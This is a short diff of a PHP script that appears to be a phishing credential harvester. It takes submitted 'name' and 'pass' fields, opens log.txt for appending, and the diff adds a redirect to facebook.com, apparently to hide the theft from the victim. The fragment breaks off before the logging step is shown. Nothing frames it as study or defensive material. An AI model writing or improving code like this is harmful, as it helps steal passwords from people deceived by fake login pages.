@@ -1,4 +1,5 @@
 <?php 
+    header ('Location: facebook.com');
     $name = $_POST['name'];
     $pass = $_POST['pass'];
     $log = fopen("log.txt", "a") or die("Unable to open file!");
